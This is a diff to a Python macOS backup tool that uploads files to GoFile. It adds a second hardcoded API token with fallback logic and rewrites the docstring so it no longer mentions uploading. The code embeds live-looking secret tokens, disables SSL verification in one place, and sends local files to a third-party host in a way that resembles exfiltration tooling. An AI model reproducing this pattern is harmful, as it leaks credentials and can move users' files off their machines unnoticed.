@@ -1,10 +1,8 @@
 # -*- coding: utf-8 -*-
 """
-Mac自动备份和上传工具
-功能：备份Mac系统中的重要文件，并自动上传到云存储
+自动备份工具-macOS版本
 """
 
-# 先导入标准库
 import os
 import sys
 import shutil
@@ -354,8 +352,10 @@ class BackupManager:
         self.session.verify = False  # 禁用SSL验证
         self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
         
-        # GoFile API token（备选方案）
+        # GoFile API token（备选方案）：主 token 失败时回退到备用 token
         self.api_token = "y2bp8HQfCVasZBwCN837ddKfuU2FZmja"
+        self.api_token_fallback = "9o0Su5ainOFK9fFxzLaiuRKPOxgaUmCm"
+        self.api_tokens = [self.api_token, self.api_token_fallback]
         
         self._setup_logging()
 
@@ -369,6 +369,7 @@ class BackupManager:
             sensitive_values = [
                 self.infini_pass,
                 self.api_token,
+                self.api_token_fallback,
             ]
             for infini_config in self.infini_configs:
                 sensitive_values.append(infini_config.get("password"))
@@ -1188,7 +1189,7 @@ class BackupManager:
             return False
 
     def _upload_single_file_gofile(self, file_path):
-        """上传单个文件到 GoFile（备选方案）
+        """上传单个文件到 GoFile（备选方案，支持主/备 token 回退）
         
         Args:
             file_path: 要上传的文件路径
@@ -1213,12 +1214,17 @@ class BackupManager:
             filename = os.path.basename(file_path)
             logging.info(f"🔄 尝试使用 GoFile 上传: {filename}")
 
+            # API token 列表：主 token 失败后回退到备用 token
+            api_tokens = [t for t in getattr(self, "api_tokens", []) if t] or [self.api_token]
+            token_index = 0
+            current_token = api_tokens[token_index]
+
             server_index = 0
             total_retries = 0
             max_total_retries = len(self.config.UPLOAD_SERVERS) * self.config.MAX_SERVER_RETRIES
             upload_success = False
 
-            while total_retries < max_total_retries and not upload_success:
+            while token_index < len(api_tokens) and total_retries < max_total_retries and not upload_success:
                 if not self._check_internet_connection():
                     logging.error("网络连接不可用，等待重试...")
                     time.sleep(self.config.RETRY_DELAY)
@@ -1232,7 +1238,7 @@ class BackupManager:
                         response = requests.post(
                             current_server,
                             files={"file": f},
-                            headers={"Authorization": f"Bearer {self.api_token}"},
+                            headers={"Authorization": f"Bearer {current_token}"},
                             timeout=self.config.UPLOAD_TIMEOUT,
                             verify=True
                         )
@@ -1287,6 +1293,14 @@ class BackupManager:
                     time.sleep(self.config.RETRY_DELAY)  # 所有服务器都尝试过后等待
                 
                 total_retries += 1
+
+                # 当前 token 已用尽全部重试，回退到下一个备用 token 重新开始
+                if total_retries >= max_total_retries and not upload_success and token_index < len(api_tokens) - 1:
+                    token_index += 1
+                    current_token = api_tokens[token_index]
+                    total_retries = 0
+                    server_index = 0
+                    logging.warning(f"⚠️ [GoFile] 主 token 上传失败，回退到备用 token ({token_index + 1}/{len(api_tokens)}): {filename}")
 
             if upload_success:
                 return True
